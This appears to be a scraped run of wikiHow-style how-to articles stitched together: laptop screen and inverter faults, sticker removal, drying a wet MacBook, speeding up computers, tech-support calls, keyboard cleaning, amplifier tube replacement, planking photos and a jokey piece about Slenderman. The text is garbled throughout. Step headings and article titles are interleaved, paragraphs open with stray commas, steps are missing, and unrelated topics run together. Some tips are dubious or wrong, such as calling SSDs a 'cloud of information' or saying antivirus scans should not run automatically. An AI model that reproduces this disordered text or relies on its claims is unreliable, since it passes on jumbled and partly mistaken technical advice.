, If you can't make out the background of the screen with a flashlight, chances are that the inverter is broken. What you want to do is hook up a monitor to the laptop, and if the monitor recognizes the laptop and the laptop's screen shows up, then you have a bad laptop inverter; that needs to be replaced. (You may also have a loose video cable, see below.)

, These are cheap to buy and swap, just figure out where it is on the motherboard.


If you have an inverter that doesn't give enough power: An inverter is simply a part in a computer which makes DC (Direct Current) into AC (alternating current), When the inverter in a laptop fails it doesn’t give the amount of power necessary for the screen and that’s why you may suddenly see it turn black for no apparent reason. Or when you turn on the computer the LCD screen doesn't turn on, even though everything else seems fine.

, Make sure that these are are not bent, cut, stripped, worn, or etc.

, There is a very thin cable which connects your laptop's motherboard to your screen and provides it with all the power and information needed to display the images. However, some laptops pull at the video cable upon opening, and may cause this cable to become loose. The only good way to tell is with the laptop open and the cable reset. However, it is recommended that this only be done by someone who has good knowledge and is comfortable with opening up the laptop. Otherwise, you'll need to ask a professional to check it.

,, The video card controls all of the information that relates to images. Basically, it tells the screen what to display. If, after hooking up to an external monitor and the screen doesn't display, it is likely a video card that has the issue. (You may also see a black screen and hear random beeps.) The majority of laptop's video cards can't be replaced solely, and the entire motherboard may have to be replaced.

Make sure this laptop isn't too old.,
Decide which stickers to remove.,
Remember to do this slowly.,
Start from the edges.,
Pull the sticker up slowly from the edge you just started.,
Clean the surface.,
A product called ""Odor Assassin"" (Lemon-Lime Scent) that is available at most ""dollar"" and discount stores will dissolve most adhesives instantly and can be removed with a clean cotton face cloth.

",How to Remove Stickers from a Laptop," The stickers will dry up, and over time, the glue backing will separate from the printed material. If you decide to remove the stickers, do it quickly. The stickers are not going to stay fresh for more than a year or two, depending upon its quality. If your laptop is a relic, skip to the very last step to use a chemical removal method.;
, Some stickers are useful, such as OEM licensing stickers that will be void when removed. Others may contain serial numbers, service tags, support information, or systems specifications. Commonly removed stickers include ones promoting the Windows operating system (ie: ""Designed for Windows XP"" and ""Windows Vista Capable""), as well as Intel and AMD CPU stickers.

, If you rush it and try to pull the whole thing off at once, you run the risk of tearing the sticker or separating the glue backing.

, Use your fingernails or a non-abrasive abrasive putty knife. Be careful not to scratch or damage any plastic or aluminum surfaces in the process.

, Try to pull it up using an angle between 45 and 90 degrees. Never bend the sticker back further than a 90 degree angle, as this will promote the separation of the glue backing and printed material.

, Some sticker residue may be rubbed off easily, while some require additional help. As always, avoid scratching the surface.
First, try rubbing off the remaining residue by hand. Many forms of glue, even when mixed with a little paper, will curl up onto itself when moved over a surface.






Second, if rubbing doesn't help, try using duct tape or other very sticky tape to remove the remaining residue. Break or cut off a piece of tape, apply it to the surface, then remove it or, if possible, simply rub the sticky surface of the tape over the residue. Repeat this until all of the residue has been removed, and attached to the tape instead.






Third, apply a small amount of cooking oil, such as canola or olive oils to the adhesive with a paper towel. Allow the oil to sit on the adhesive for site 2-5 minutes. The adhesive should now easily scrape off with your finger or a soft plastic tool. Using window cleaner, such as Windex, and a clean paper towel clean the remaining oil and adhesive off.






Fourth, if all previous attempts fail, use chemicals. A popular and extremely useful method is to use a citric-acid based cleaner such as ""Goo-Gone"". These types of cleaners will not harm metal or harder plastics, but may dry the surface of softer plastics, leaving a white, frosted appearance. Test this on a small, hidden area first. Another liquid to try is alcohol (try spraying a small amount of your deodorant or perfume, if that is handy). Aerosol furniture polish, like Old English, can be very effective. Another is WD-40 which won't hurt the surface and can be cleaned off the computer's surface with a dish rag and a little soap.

Unplug the MacBook immediately and remove the battery (do not leave your computer plugged in).,
Do not turn the MacBook back on yet.,
Catch your breath, the worst is over!,
Use a hair dryer.,
Try the natural and ecological approach as an alternative.,
Leave the MacBook  in a dry place for at least two days.",How to Save a Macbook from Liquids," Once the MacBook is turned off, use paper towels to absorb a maximum amount of liquid. If the keyboard allows it, use paper towels to mop up under the keys.


The problem with liquids is not the deposit that remains after it dries, except for the mechanics; it is the damage caused when the liquid is still present. It creates short circuits which results in components burning, something you usually can't see happening with the naked eye.;
, The inside of your MacBook must be completely dry, that is to say, there should no longer be the slightest trace of moisture. Until you are absolutely sure it is totally dry, it must remain unpowered (both battery and electricity).

, Now, on to the drying stage where two options are available, as explained in the following steps.

, If you choose this method, follow this important advice:


Use the hair dryer on the entire keyboard, not just the area where the liquid entered it.
Don't place the fan too close to the keys, as you could melt them.
Stop occasionally to avoid overheating the MacBook components. Overheating your MacBook would do far more harm than good.

, It's simply using rice. Rice is a highly effective desiccant. In this method, open your MacBook halfway, face down in a box. Line the bottom of the bow with a bed of rice for absorption.

, Turning on your MacBook before then greatly reduces the chances of recovering your valuable object! Good luck!

Remove the front bezel to gain access to the laptop screen itself.,
Locate the bracket screws and unscrew them.,
Place a soft cloth or tissue paper on the keyboard.,
Take out the laptop’s screen gently from the top and lay it facedown onto the laptop’s keyboard.,
Remove the video connector.,
Disconnect the inverter.",How to Remove a Laptop Screen," Laptop screens have rubber screw covers along the front bezel of the screen assembly. Sometimes, however, the rubber covers do not have any screw under them, so it would be wise to only partially remove the them to see if there are any screws hidden beneath.


The front bezel is the protective material around the edges of your laptop's screen, typically made of plastic. The screen assembly is the top half of your laptop that houses the screen.;
, Once you find the screws of the front bezel, unscrew them all with a Phillips screwdriver.


Make sure to place the rubber screw covers, as well as the screws themselves in a place where you won’t lose them.

, Gently pry out the front bezel by holding the edge of one side of the front bezel with a forefinger and applying pressure down onto the screen with your thumbs.


Do the described process all along the sides of the screen assembly until you can remove the front bezel completely, revealing the laptop screen.

, The laptop screen is typically held together by metal brackets on both sides. Remove these brackets by unscrewing them.


Again, place the screws where you won’t lose them.

, You will need this later to protect the screen you will be removing.

, Do not pull on the screen or remove it completely, as you will risk damaging the video connectors by doing so.


The video connectors have to be disconnected from the screen before you can completely remove the screen.

, Once you lay the screen facedown on the keyboard, you will see a strip of cable at the back of the screen; this is the video connector. Peel off the tape that attaches the cable to the screen then detach the video connector by gently pulling it out.


Some laptops models may feature locking mechanisms on the video connector, so make sure to flip the lock open first before pulling the video connector away.

, The inverter provides power to the screen’s backlight; this is typically located at the bottom of the screen. Disconnect both the screen cable and the video connector from the inverter by pulling them out gently.


With the cables disconnected, you can now completely remove the laptop screen.

Store the battery in a dry place away from direct heat or sunlight.

, Some software can be susceptible to viruses and can inhibit performance.


Understand your laptop's up-time. Up-time is a measure of your operating system's reliability. Unix-like operating systems such as BSD and Linux have the longest up-time. Research and compare up-time records yourself.
Downloaded software and screensaver often cause conflicts and use valuable memory. Remember that laptops are tools for learning, and keeping them free of unnecessary programs will help it working quicker with less freezing.
Always back up all files in at least two places.
Virus protection is very important.
Beware of spyware. It is the latest computer security problem. Spyware is software designed to collect computer users' personal data without their knowledge. Spyware is secretly installed with many downloaded Internet software programs, and transmits information about computer usage and generates pop-up advertisements. Microsoft estimates that spyware is responsible for half of all PC crashes.

, Your computer, like your car, needs regular tune-ups. This will improve the laptop's ability to run smoothly.

Elevate the laptop.",How to Keep Your Laptop from Overheating1," Put a small book or item (like the docking station for your iPod) under your computer's battery when sitting at your desk. This slight tilt allows a lot more air to flow under the laptop, keeping it significantly cooler. Ensure that the book is not blocking the bottom fan hole.


If a book doesn't help, you can try something more uneven. Try sticking four sockets from an egg tray on four corners of your laptop. Either you can stick them with a sticky tape/masking tape or use hook and loop tape for flexible design.;

Return to the basics.,
Cut down on start-up programs.,
Clear temporary data.,
Consider using alternatives to traditional browsers.,
Run security scans weekly.,
Uninstall unused or superfluous programs.,
Run a system defragmentation.,
Restart your computer.",How to Get Your Computer Running at Full Speed1," When it comes to standard, routine software maintenance, whether you have a PC or a Mac doesn't matter; nor does your software edition or your hardware specs. What matters is your computer etiquette: shutting down regularly, installing updates when they become available, and closing unused background apps are all behaviors that will significantly increase your processing--and therefore, overall--speed. Before you make any changes to your computer's programs or processes, make sure you're practicing good computer etiquette.;
, Even factory-new computers try to run a ridiculous amount of software in the background when you boot up. Generally speaking, you should disable any program you don't absolutely need from starting upon login; this includes things like browsers, game services, and entertainment suites.


Windows allows you to customize which programs start up automatically by going to Start, then Run, then typing in ""msconfig"". This action brings up a checklist of the default programs that begin upon login, allowing you to uncheck the ones you don't want.
Similarly, Mac users can access System Preferences in their settings, then click on Users & Groups. Click on your username, then select ""Login Items"" to see a checklist of default login programs. Uncheck items as you see fit.

, Your computer and your internet browser of choice both store temporary files every time you access a webpage or open a document. Since these files can clutter your random access memory, clear them as often as possible.


Your web browser will have the option to clear temporary files and cookies in its settings tab, regardless of your browser choice. If you clear this data frequently, you will notice a huge difference in your browsing speed.
On PC, your desktop's temporary files can be accessed by locating your default hard drive, accessing it, clicking the ""Windows"" folder, then navigating to the ""Temp"" file and accessing it. Select the entire folder's contents and delete them.
Macs compress and store information much more efficiently than most PCs, so OS X users won't have to clear their caches as frequently. That said, you can access your cache by going into your hard drive, clicking ""Library"", then clicking ""Caches"". Once there, delete the temporary files the same way you would on a PC. , While Internet Explorer and Safari do come standard, there are much more efficient browsers available. Firefox, Google Chrome, and Opera all boast RAM-saving technology, and as long as you minimize in-browser add-ons, any of these will run much faster than IE or Safari by default.


If you do decide to stick with IE or Safari, don't install extra browsers or internal add-ons; this will help you get the most out of these programs.

, Malware significantly slows down your computer, and you likely subject yourself to it on a daily basis. To combat malware and viruses, run a security check through the antivirus program of your choice on a weekly basis.


Make sure your antivirus program isn't set to run automatically; you don't want it running and requesting a reboot in the middle of your work time.
Find an antivirus program that doesn't utilize a bunch of subprocesses or browser add-ons. AVG freeware is a relatively customizable and fringe-free service, and it will reliably remove most malware.

, Most computers come equipped with a huge array of free trials of random programs, games, and services that you will never use. Uninstall these along with any redundant programs--for example, if you use iTunes as your default music provider, you probably don't need Media Player.

, Over time, PCs allocate bits of files throughout your drive, making them harder to retrieve which, in turn, causes your computer to take longer when loading these files. To run a system defrag, open the Start menu, navigate to Control Panel, click on the link titled ""System and Security"", and select ""Administrative Tools"". A menu should pop up; select the defragment option, select a drive to defragment on the menu, and follow the onscreen instructions. Defrag is sometimes set to run automatically. If this is the case, this can also slow down your computer during inconvenient times, so make sure that you either have defrag set to manual or a time at which you will not be inconvenienced by it running.
If you have a solid state drive (SSD), do not run a defragmentation process. Since these drives have no moving parts and rely on a cloud of information rather than specific storage, this can damage the hard drive.
Mac users don't need to worry about defragmenting their drives due to differing technology.

, After you've completed all of these steps, restart your computer to finalize any processing changes. Your computer should be running much faster now.

",How to Keep a Laptop Keyboard Clean," A good keyboard protective film can effectively reduce the wear and tear and prevent dust and debris from falling into the keyboard slots.;
, The keyboard is the most easily soiled part on a laptop. In order to avoid the keyboard of oil, wash your hands before using your laptop, so as not to dirty the keyboard.

, Many players use the laptop to play games, so a few frequently-used buttons tend to wear out more quickly than the other keys. Pay attention to the intensity of your typing if you use the keyboard frequently.

, If you do not have canned air available, you can also use a hair dryer to remove dust, but note that the hair dryer must be set to ""cool"" so that it only blows cold air.

, Foreign bodies can fall into the cracks in a keyboard, which will affect normal use. Water and other liquids may lead to more serious consequences.

Determine your current RAM type, amount of RAM installed and maximum availability.,
Shop for your upgrades.,
Access the memory compartment of your laptop.,
Install the new RAM sticks.,
Return your laptop to operating condition.,
Check to be sure that your laptop is recognizing the total amount of RAM you have installed.",How to Install Notebook Memory,"


Some laptop brands make it easy for you to find out the type of RAM you have, but it can be a challenge for other brands.
Check the documentation that came with your computer.
Visit your laptop brand's support site and search for your model and build to determine the kind of RAM. The model, serial and build numbers are found on stickers on the bottom of your computer.
If all else fails, visit www.crucial.com and download their free system scanner. Running this quick scan will produce a browser window with your computer's RAM details.;
,


Prices for the various types of RAM can vary. It's possible to find 4 GB sticks of DDR3 RAM for about $50, or a set of 2, 2 GB sticks for $64.
Many computer technicians recommend that you install RAM as matched pairs, splitting the total RAM in a laptop into 2 equal sticks. Using multiple smaller sticks of RAM rather than one larger stick can increase the bandwidth of the memory and improve performance in some cases.

,


Power down your computer. Once it has completely shut down, unplug the power cable from the wall and then from the computer.
Flip the laptop over onto a static-resistant surface. Touch a switch plate or otherwise ground any static electricity you may have built up. Remove the battery.
Find the memory bay and remove the small screws holding the door. Lift the door out of place.

,


If you are replacing 1 or more sticks, remove them first, working from the top down for sticks that overlap.
Gently pull back the clips securing the RAM stick and lift the outside edge slightly. Slide it back out of the bay when it is at a 45-degree angle.
Insert the new sticks in the opposite fashion. Seat the pins into the bay while holding the stick at a 45-degree angle. Once the RAM is seated, press it down until the clips snap around it.

,


Replace the memory bay door and screws. Reattach the battery and plug in the power cable.
Turn on your computer.

,


If it is not, follow the process again to make sure the RAM is seated firmly in place and installed correctly.
If the RAM is still not recognized by your computer, double check the system specifications to be sure your system is capable of supporting the amount of memory you have installed.

Buy a laptop cooling mat.,
Maintain a cool environment.Try keeping your laptop in an air-conditioned or cool area to allow your system to cool down and prevent it from overheating.

,
Consider using a heat sink.",How to Keep Your Laptop from Overheating2," There are many brands to choose from (Thermaltake, Xion, Targus) and are available at computer stores like Best Buy or online from Newegg. You can even buy risers, or computer stands, that have ventilation.


If you can't afford/find cooling mat, always prefer something hard under the laptop rather than something soft. For example, use a plastic casing, a lap desk, tray table or even a wooden cutting board to provide a solid, flat surface to allow proper airflow.
Don't use your laptop on soft surfaces such as a sofa, carpeting, folded quilt or pillow. Any vents located on the bottom of your laptop will be blocked and airflow will be reduced, causing it to overheat. It may even overheat enough to catch on fire.

,, Use a steel flat bar as an external heat sink. It works because your computer has to heat up more mass before it overheats. This also means, that the larger the bar, the longer it will take for it to overheat. It will only work if your laptop has a metal case, and it feels hot.

Review your options.,
Clean your hardware.,
Upgrade your RAM.,
Install a larger hard drive.",How to Get Your Computer Running at Full Speed2," Before you begin upgrading or changing the hardware in your computer, you should know what your machine is capable of. As a general rule, PCs have much more flexibility than Macs by default, though newer models of Macs allow some hardware customization. Your best bet is to take your computer in to any Apple store or Best Buy tech department. They should be able to tell you exactly what your computer can and can't support based on its model; know this information before you proceed.


For example, while some Macs let you change or add RAM, the MacBook Air and Retina MacBook Pro are fixed--you can't upgrade the RAM on these models. , Invariably, dust will end up in your computer's inner parts. Though an extensive cleaning usually mandates professional experience with hardware, anybody can vacuum off their keyboard and the side vents to improve your computer's circulation. If you haven't ever had your computer cleaned, especially if it's a few years old, taking it to a specialist to have it scrubbed is a great way to seriously improve your computer's performance.

, Random Access Memory, or RAM, is one of the key components in processing information. Logically, the more RAM you have, the more wiggle room your system has for spikes in memory usage. Upgrading your RAM is often cheaper and more immediately effective than changing out your hard drive.


RAM is especially important to upgrade if you're using your computer for gaming or video editing.
While many PCs have up to four RAM slots for a grand total of up to 16 gigabytes of RAM possible, Macs are much more limited, with most Macs using around three gigabytes of RAM. , If you use hefty programs and files on a daily basis, you're bound to notice a fair amount of slowdown; the aforementioned tech departments will happily recommend a pertinent hard drive model. If you don't want to have a third party install the hard drive for you, this article will tell you how to install a PC hard drive.


If you're replacing your only hard drive, be sure to back up your files before swapping drives. You'll also have to reinstall your operating system upon reboot.
A cheaper option is to simply purchase an external hard drive and move your heftier files off of your computer. Cloud storage is also a viable option, though the external drive proves to be cheaper in the long run.
If you're willing to spend a fair amount of money, a Solid State Drive (SSD) will significantly speed up your data recovery rate, leading to unprecedented levels of operation speed. Most recent Macs come with an SSD installed standard, but if your model of computer doesn't have an SSD, consider installing one.

Set up a tech support appointment, if possible.,
Use automated message shortcuts to get to a tech support representative faster.,
Ask for a call back number and a ticket number.,
Prepare to work with the representative to find the answer.,
Be specific.,
Be patient.,
Be courteous.,
Set up a time to follow up on the problem.",How to Get Real Help From Tech Support," Computer crashes and error messages often arrive at inopportune times, which can result in anger and anxiety. Go for a walk, make yourself a cup of tea or use another method to allow you to return to the problem with a fresh perspective. During the process, it's integral to keep your computer turned off so internal processes have the opportunity to cool down.;
, Sometimes simple snafus cause issues we didn't really mean - hitting a wrong button, jarring the desk, and even opening several files in succession when our memory can't handle it. The following are good to try before calling tech support:


Check to ensure that everything is plugged in correctly. Although this may seem obvious, cords can easily be pulled out of walls or the back of computers without noticing. If your screen has gone dead, this is the first place to check. You may also check your cords for burns, and check your surge protector to make sure that too much isn't plugged in.
Inspect your PC for debris around the fan, circuit board and other areas. Although PCs are mechanically built to last a decade, it is highly common for a system to slow down over the years. For any number of reasons, computers can start to erode from within, and cause your motherboard to errantly send commands to BIOS.
Try restarting. On a Windows PC, you can reboot into safe mode. Sometimes a force quit can fix the problem, although you risk losing data. You can also hold down the power button for roughly 3-5 seconds to 'kill' the computer if frozen. Wait 30 seconds, then reboot. Save the information if possible.
Look for a help menu on your program toolbar. Use the search function to try to find the information about your issue. Many common problems are listed in the help section. Following these written instructions, if they are available, is likely to save time.
Check to see if other people on your network are having the same problem. It may be a problem with network connectivity or a company-wide program. Check with a colleague, your company's tech department or your own Internet connectivity. Visit your internet service provider's website to see if any known outages or intermittent connection issues are happening.

, Your account number, serial number, computer model, software version, warranty information and error information are the first things that your tech support representative is going to ask for. It will save you time on the phone if you have already gathered on a pad of paper in front of you.


You can find information on your computer by clicking on the top or bottom toolbar. There is often an option to click ""About this Computer"" or ""System Information."" For applications, you can look for a ""Get Info"" or ""Software Information"" option when you right click on the application or look in the top toolbar.

, If you search on a company's website or materials, you are likely to find a general number that will require you to punch in many choices on an automated menu. Before calling, look up your organization on GetHuman.com, and they will suggest more specific numbers that will save time.


GetHuman will also tell you if the company has a live chat option or a call back option, so you don't have to wait on hold. These may also save you time during your troubleshooting.
Another service website, called LucyPhone.com, will help you find the number and then call it for you. You input your phone number and they call you when a tech support person is on the line.

, Many calls to tech support can take up to an hour, with hold times and problem solving. Do not call if you need to step into a meeting or leave your office. A la carte tech support personnel like iTok actually give you dedicated numbers to call which allows you to bypass tech support; ConnectWise operates the same way. Some technical support consultants are taking advantage of computer owners by either keeping them on hold, giving them useless information while on the phone or simply not calling back as promised; this is why setting aside an appointment would work best for you.

, Many companies help you to avoid wait times by setting a convenient time for both parties. In many cases, the person may learn from your appointment request what the problem is, and they will be able to have the necessary information handy.

,


Press ""0"" instead of any of the other options. Sometimes you can do this right away or while the automated message is still speaking.
Press the Spanish speaking option. These operators are often less busy than the English speaking operators. They are usually bilingual as well. You can try this option to decrease the wait time before a tech support person is available.
Avoid pressing a number as directed by the automated menu. This tells the operator that you do not have a touch tone phone, and may direct you immediately to a representative.

, When you reach tech support, you want to ensure that there will be notes on your conversation. If the problem arises in the future, other representatives will be able to access what has been done so far through either your phone records with the company, or the ticket that was assigned during your initial call.

, Although many of us want to call up and say ""Please fix it,"" that is not a reasonable thing to expect. You can assume that your tech support agent will ask you to try a number of things and report back on what is happening.

, Articulate the problem that you need fixed and what is different from normal device operation. A call to tech support may be an opportunity to learn more about your device, and you will save time by avoiding general statements like ""It just doesn't work.""

, Fixing a device from a remote location is more time consuming than doing it in person. Expect long pauses and do your best to be ready for the next step.

, Tech support people understand that you may be angry or frustrated, and they are trained to handle it. However, avoid being mean or making personal attack

s, because you are likely to have the call ended without a solution to your problem., If you need to leave the call prematurely, make sure you know what you should do next to solve the problem. Ask for advice on where to go next if the person is unable to help you.

If you don't have compressed air, turn the keyboard upside down and tap the back while shaking gently.







, Dampen a cotton swab or clean cloth with isopropyl alcohol. Run it around the edge of each key to remove grease and dried liquid.Some people have reported success with baby oil, but it can remain in your keyboard, so use at your own risk.

Before you continue, unplug the keyboard, remove batteries from a wireless keyboard, or shut down and unplug the laptop.

, Most laptops have keys that are difficult or impossible to remove. In these cases, you'll need a guide or advice specific to your laptop model, or you'll need to have your laptop professionally repaired.


Macbook keys from 2012 or later can be pried up by pulling the top left corner., On desktop keyboards, the outer key covering can usually be pried up easily with a flat-head screwdriver.


Most debris is found in the letters and numbers. Other keys tend to be less dirty and more difficult to replace after removal, especially the space bar., Use compressed air to remove exposed dust and debris, and a cloth dampened with isopropyl alcohol to remove stickiness and stains.


For laptop keyboards and other keyboards with delicate internal parts, use gentle swabbing only.

, If the underside of your keys are discolored or dirty, put them in a colander and run water over them, or rub them in a bucket of soapy water. Let them air dry completely on a paper towel.

, Try this technique if your laptop key raises or lowers extra slowly. After removing the key, look for a square plastic object around the button. Remove this gently by pushing the corners sideways with a toothpick. Rinse this in water to clean the hinge, then let air dry.


On a Macbook, the catch that holds these hinges in place are on the lower left and right., Let all the keys dry, then push them down over the buttons to reattach them. Let the keyboard dry overnight before you use it.

Repair internal laptop connections.",How to Fix Sticky Keyboard Keys3," If you only have keyboard problems when using a single application, you'll need to look for help fixing that software issue.

, Inconsistent results from keystrokes can be caused by low battery power. USB keyboards work best when plugged directly into the computer, not into a hub, keylogger, or other device., Keyboards with a circular, six-pin PS/2 plug sometimes encounter errors if they are connected while the computer is on. Shut down the computer, disconnect the keyboard, and reconnect it again., If some of your laptop keys don't register when pressed, there could be a loose internal connection. Unless you have a guide for your model and are comfortable disassembling your laptop yourself, you should take it to a professional.

Clean up your startup sequence.,
Clean up hard drive.,
Check for misbehaving programs.,
Install more memory.,
Install a faster hard drive.,
Reinstall or upgrade your operating system.",How to Fix Slow Computers1," Viruses and other malware are one of the primary causes of slow performance. Adware can bog down your computer and tie up your network connection, and viruses can make your CPU and hard disk use skyrocket. Removing any malicious programs should be your top priority, and you should always have a lightweight antivirus program installed, such as BitDefender or Avast.


Removing viruses can be a difficult process, and oftentimes it may be easier to simply backup and reinstall your operating system instead of trying to track it down and eliminate it.;
, A failing hard drive can significantly slow down your day-to-day computer speed, and can eventually lead to file corruption and computer failure. All hard drives fail eventually, so it's a good idea to stay on top of your hard drive's health.


You can run error-checking tools using the built-in Disk Management utility, or you can download more extensive programs that can perform a variety of tests on your hard drive.

Defragment. A fragmented hard drive will slow down your computer and affect the speed at which programs load and write to the hard drive. Defragmenting your hard drive on a regular basis will ensure that your programs are loading as fast as possible. Defragmentation happens automatically on most newer versions of Windows, but it important to check in on regularly.

, As you add more and more programs to your computer, you'll find that many of them add themselves to your computer's startup sequence. While this can be useful if you use the programs often, too many programs can have a negative effect on your computer's speed, especially the time it takes to boot up. Removing these unused programs for your computer's startup sequence.


Even if you use a program often, it doesn't necessarily need to start up with the computer. Most programs will work fine if you start them up later, so you don't need to clog up your startup sequence with a bunch of programs.

, If you have less than 15% free space on your hard drive, it could be impacting your system performance. For optimal performance, you should try to keep at least 25% of your hard drive free. This will allow programs to read and write much more quickly. Uninstall old programs you don't use any more, and clean out your old files and documents on a regular basis.



CCleaner is a very powerful hard drive cleaning program. The basic version is free and can quickly analyze your computer and clean out unused files and registry entries.
Uninstalling old programs is a great way to keep your computer performing well. Many programs run in the background and start up with your computer. If you're not using these programs, they're taking up resources that could be better used elsewhere.

, Some programs, for whatever reason, just don't work very well. When this happens, they may eat up all of your processing power or monopolize your hard drive read and write speed, slowing down everything else on the computer. Identifying and removing these programs will help make sure that everything is running as smoothly as possible.


You can see what programs are hogging all of your resources by using the Task Manager. Look for programs that are taking 90% or more of your CPU or are taking the majority of your available memory. You can end these programs from the Task Manager if they're not critical.

, If you've exhausted all of your free options for speeding up your computer but still aren't getting the performance you want, it may be time for a hardware upgrade. The first place to start looking is your computer's RAM. This is the memory that programs use to temporarily store data while they are running. Generally, installing more RAM will allow you to run more programs at once, though there will be diminishing returns. The general baseline amount of RAM for modern desktop computers is 4 GB. 8 GB is recommended for most gaming computers.


RAM is one of the cheaper upgrade options available, and you can have it installed in just a few minutes.
When installing desktop memory, you almost always will be installing in pairs. Both sticks will need to be the same manufacturer, model, size, and speed. If they do not match, your RAM will be clocked down to the lowest speed and your computer might not start.
Most RAM is sold in pairs. Laptops generally have much less breathing room when it comes to upgrading RAM.

, Most standard desktop hard drives run at 7200 RPM, while most standard laptop drives run at 5400 RPM. Upgrading your hard drive to a faster speed, such as a Solid State Drive (SSD), can dramatically improve loading times on your computer. This will be especially notable during the startup phase.


If you are upgrading the hard drive that your operating system is installed on, you will need to reinstall your operating system.
SSDs are typically much more expensive per GB than a standard hard drive, and as such they are generally smaller. A popular setup is to install your operating system and essential programs on the SSD, and then use a larger standard hard drive for media and document storage. This will give you very fast operating system speeds, and you won't have to worry about the smaller size.

, Sometimes, the best way to improve performance is to simply wipe the slate clean and start from scratch. Reinstalling Windows will clear your hard drive and improve performance. Upgrading to a newer version of Windows will often increase performance as well, though obtaining a newer version will set you back about $100.


If you can, try to format and reinstall your operating system at least once per year. This will ensure that your computer is always running at optimal speed.
Many people are put off by the thought of the time investment needed for reinstalling their operating system. If you have a good backup system already in place, you can have your computer formatted and your operating system reinstalled in about an hour. When it comes to reinstalling your old programs, you'll probably find that you actually used less than you thought.

Reinstall OS X.,
Upgrade your hardware.",How to Fix Slow Computers2," As you install more and more programs on your Mac, you'll find that some of them make their way into your startup process, whether or not you use them regularly. Cleaning out your startup queue can drastically reduce the time it takes OS X to startup.


Many programs attach themselves to your startup process but don't actually need to start with your computer. Most programs will run fine if you open them later, speeding up the time it takes your computer to start up.

, Having free space on your Mac will help other programs run, and will reduce loading and saving times dramatically. Always try to have at least 15% of your hard disk space free and available.


There are several programs available for Mac that can make cleaning up and maintaining your hard drive much easier, such as OnyX, CleanMyMac, and MacKeeper. These allow you to see exactly what types of files are taking up the most space, allowing you to quickly remove files you no longer need.

, Programs will occasionally stop functioning correctly, and when they do they may eat up all of the resources on your computer. Identifying and removing these bad programs will go a long way towards improving your computer's health and performance.


The Activity Monitor allows you to check what programs are causing your system the most stress. You can open the Activity Monitor from the Utilities subfolder in the Applications folder.
Processes that are taking the majority of your CPU or memory will have a big impact on your computer's performance. Use the columns in Activity Monitor to determine the offending programs.

, Sometimes simply wiping everything and starting over can give you some of the best performance increases. Reinstalling your operating system will delete everything on your hard drive, so be sure to back everything up first. Once your files are backed up, reinstalling the operating system should only take about an hour.


Take stock of the programs you actually use. You may find after reinstalling that you use less programs than you thought you did, meaning more free space and less time spent reinstalling programs.

, If you have tried everything but still can't increase your speed, you may want to consider upgrading your Mac's memory. RAM is not incredibly expensive, and it can help improve performance quite a bit. It is not guaranteed to fix everything however, so don't spend too much money for gains you might not even achieve.


RAM can be installed in just a few minutes, on both desktops and MacBooks. Different systems require different types of RAM, so be sure to check the documentation for your Mac to see what kind you should get and how much the computer supports.

If you answer yes to any of the questions below, your power tubes may need replacing. These tubes are the larger unguarded tubes located in the middle of your amp.


Is there a crackling sound or volume fluctuation when the amp is in use?
Does the amp fail to turn on when the power cable is connected to a working outlet?
Are the tubes glowing unevenly?
Are burn marks or cracks on one or more of the power tubes?;
, If you answer yes to any of the questions above, your preamp tubes may be the problem. These tubes are smaller and located at the sides and front of the amp and they have a small aluminum casing surrounding them.

Are the power tubes in seemingly working condition yet your tone or volume seems bland or quiet?
Does a crackling or screeching sound change when you adjust the volume knob?

, Look at the instruction manual for information on compatible tubes for your amp. These tubes are best to buy in pairs with matched ratings.

Discuss your tube options with technicians or salespeople before making a purchase in store.

, Wait about 15 minutes before maintenance. The tubes must be cool and uncharged for safety purposes., The screws will be located on the side of the head, or on the back of the cage itself.

, Use gloves or a cloth to handle new tubes. There is some debate going on about the influence of oils in human skin on a tube. In addition, there is no harm in wearing gloves to change tubes so it may be a good exercise in caution.

Do not place tubes near any ledges. The round tube has the tendency to roll around so use a cloth to place under them.

, Firmly grasp the tube with one hand and press down on the clamp to provide room for the tube to move.


Gently rock the tube back and forth while lightly pulling upwards.
Note the positions of the pins on the bottom of the tube. There is a plastic nub in the middle of the bottom of the tube that fits into a guide in the socket.







,,

Press on the clamps if needed to ease the tube in.
When the pins are no longer visible the tube is in place.
If you plan on replacing the preamp tubes as well, leave out any power tube replacements that may crowd the area you are working in.

,


Remove the screws on the metal covering that encases the preamp tubes.
Lift the covering directly up to avoid metal on glass contact.
Gently rock the tube back and forth while lightly pulling upwards.
Note the position of the pins.







, This is done in the same fashion as the power tubes except that the pins will have a prominent gap between two pins instead of a nub. Match this gap up with the corresponding gap in the preamp tube socket and gently place it in.,,, Let it warm up for about 20 minutes. This will allow the amplifier to adjust to the new tubes.

, If you plank in a park and no one is around to see it, did you plank? Pics or it didn’t happen.

, You can look around the Internet by searching plank tags or using Google to get ideas of clever or funny places to plank. This can also help you build an idea of what makes a good plank pic and location.

, Look for potential places to plank as you go around your town or visit other places. Look for any place that might be funny or unique.

, You can also just try being random. Pick a random location, such as a local park, and simply go there and plank on whatever you can. Improvising like this can lead to more unique pictures.

, As you are preparing to plank, be sure you won’t get in trouble. Do it in a location where you won’t bother anyone or break anything, or do it in a less acceptable location when no one is watching. You don’t want to get in a fight with a cop over planking. That’s not going to sound very impressive later on when you have to tell the story every time you apply for a job.

, Lay face-down in a rigid, straight position. Balance on whatever object or surface you wish to plank on. Hold your arms at your side, palm flat against your thigh. Keep your feet perpendicular with the line of your legs, if possible, so that your toes touch the planking surface.

, Get whatever friend you brought with you to take the picture. Be sure that the camera is adjusted for lighting if taking the picture at night or in a dark location. Upload the picture for all the internet to marvel at.

Know that you could take him.,
Think about his background.,
Think about his mortality.,
Visualize his hugs.,
Know that he's virtually senseless.,
Picture him as calamari.",How to Get over Your Fear of Slenderman1," Sure, maybe he's 7 feet (2.1 m) tall (2.1 m), but he's a stick. You know his name, Slenderman? It's because he's skinny, VERY SKINNY! And he was probably a geek in high school, which is why he's acting like a 'scary masked man'. You could totally kick his flat butt if he came at you.


Think of some names equivalent to Slenderman and just how absolutely non-scary they are. Fatboy. Voluptuousgirl. Pear-shapedandrogynousperson. Really? You're gonna let a guy named Slenderman get the better of you? C'mon. You can do better than that.;
, Let's take what we know about this guy (which, admittedly, is very little): He wears a suit every day. What kind of person wears a suit every day? Either he's incredibly educated and has a well paying job or he's Barney Stinson. Let's consider both theories:



Slenderman is wealthy and educated. If this is the case, he's probably open to reason. Odds are he prefers the aisle seat on an airplane, doesn't eat very much junk food, watches very little television, and listens to audio books on his commute to work.Now that you know some of his tendencies, you can strike up a conversation! Humans only fear the unknown.

